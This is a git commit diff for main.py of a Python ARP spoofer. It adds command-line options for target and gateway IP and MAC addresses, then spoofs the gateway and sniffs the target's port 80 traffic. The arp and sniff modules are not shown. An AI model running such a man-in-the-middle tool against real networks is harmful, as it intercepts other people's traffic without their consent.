0525142efd83bc51290fc98de8d2adbe5f890316
gbnk0 <michael.amara2@gmail.com>
2016-05-10 17:46:39 +0200

    New: argparse: script usage: ./main.py -t target_ip -m target_mac -g gateway_ip -a gateway_mac

--- main.py
+++ main.py
@@ -1,16 +1,25 @@
 from multiprocessing import Pool
 from network import arp, sniff
+#pip install argparse
+import argparse
+
+
 
 def run(i):
     i.run()
 
 if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description='Python arpspoofer')
+    parser.add_argument('-t','--target-ip', help='Specify the target ip', required=True)
+    parser.add_argument('-m','--target-mac', help='Specify the target MAC', required=True)
+    parser.add_argument('-g','--gateway-ip', help='Specify the gateway ip', required=True)
+    parser.add_argument('-a','--gateway-mac', help='Specify the gateway MAC', required=True)
+    args = vars(parser.parse_args())
     p = Pool(2)
     
-    target = ["128.113.222.83", "08:00:27:6e:2e:1a"]
-    # target = ["0.0.0.0", "ff:ff:ff:ff:ff:ff"]
-    
-    gateway = arp.spoof("128.113.223.254", "f0:de:f1:01:8e:8a")
+    target = [args['target_ip'], args['target_mac']]
+
+    gateway = arp.spoof(args['gateway_ip'], args['gateway_mac'])
     gateway.setTarget(*target)
     
     watch = sniff.watch(target[0], 80)
